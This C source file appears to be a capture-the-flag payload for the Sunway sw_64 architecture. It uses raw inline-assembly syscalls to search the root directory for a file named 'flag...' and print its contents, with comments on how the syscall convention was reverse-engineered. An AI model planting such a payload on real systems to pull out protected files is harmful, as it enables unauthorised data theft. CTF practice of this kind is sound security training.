// sw_64sw6b-sunway-linux-gnu-gcc -Os -static -nostdlib -o payload payload.c

#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/syscall.h>
#include <unistd.h>

static long _syscall(int nr, long a0, long a1, long a2, long a3, long a4,
                     long a5);

#define syscall0(nr) _syscall(nr, 0, 0, 0, 0, 0, 0)
#define syscall1(nr, a0) _syscall(nr, (long)(a0), 0, 0, 0, 0, 0)
#define syscall2(nr, a0, a1) _syscall(nr, (long)(a0), (long)(a1), 0, 0, 0, 0)
#define syscall3(nr, a0, a1, a2)                                               \
  _syscall(nr, (long)(a0), (long)(a1), (long)(a2), 0, 0, 0)
#define syscall4(nr, a0, a1, a2, a3)                                           \
  _syscall(nr, (long)(a0), (long)(a1), (long)(a2), (long)(a3), 0, 0)
#define syscall5(nr, a0, a1, a2, a3, a4)                                       \
  _syscall(nr, (long)(a0), (long)(a1), (long)(a2), (long)(a3), (long)(a4), 0)
#define syscall6(nr, a0, a1, a2, a3, a4, a5)                                   \
  _syscall(nr, (long)(a0), (long)(a1), (long)(a2), (long)(a3), (long)(a4),     \
           (long)(a5))

void _start() {
  char name[64];
  char buf[8192];
  name[0] = '/';
  name[1] = 0;
  int fd = syscall2(SYS_open, name, O_RDONLY | O_DIRECTORY);
  ssize_t nread = syscall3(SYS_getdents64, fd, buf, 8192);
  char *ptr = &buf[19];
  while (ptr < &buf[nread]) {
    unsigned short len = *(unsigned short *)(ptr - 3);
    if (len - 20 > 4 && ptr[0] == 'f' && ptr[1] == 'l' && ptr[2] == 'a' &&
        ptr[3] == 'g') {
      int ffd = syscall3(SYS_openat, fd, ptr, O_RDONLY);
      ssize_t flaglen = syscall3(SYS_read, ffd, buf, 128);
      syscall3(SYS_write, 1, buf, flaglen);
      break;
    }
    ptr += len;
  }
  syscall1(SYS_exit_group, 0);
  __builtin_unreachable();
}

// How to figure out this:
// 1. Use objdump to disassemble libc-2.23.so, realize that the syscall
// instruction is `sys_call 0x83`, and mmap wrapper does not touch argument
// registers so syscall convention should be the same as the userland calling
// convention.
// 2. Check the register syntax for DEC Alpha (lol), realize that it's $0
// instead of r0.
// 3. Read
// http://bitsavers.trailing-edge.com/pdf/dec/alpha/Alpha_Calling_Standard_Rev_2.0_19900427.pdf
// (loooooool)
static long _syscall(int nr, long a0, long a1, long a2, long a3, long a4,
                     long a5) {
  register long r0 asm("$0") = nr;
  register long r16 asm("$16") = a0;
  register long r17 asm("$17") = a1;
  register long r18 asm("$18") = a2;
  register long r19 asm("$19") = a3;
  register long r20 asm("$20") = a4;
  register long r21 asm("$21") = a5;
  register long ret asm("$0");
  asm volatile("sys_call 0x83"
               : "=r"(ret)
               : "r"(r0), "r"(r16), "r"(r17), "r"(r18), "r"(r19), "r"(r20),
                 "r"(r21)
               : "$1", "memory", "$22", "$23", "$24", "$25", "$26", "$27");
  return ret;
}
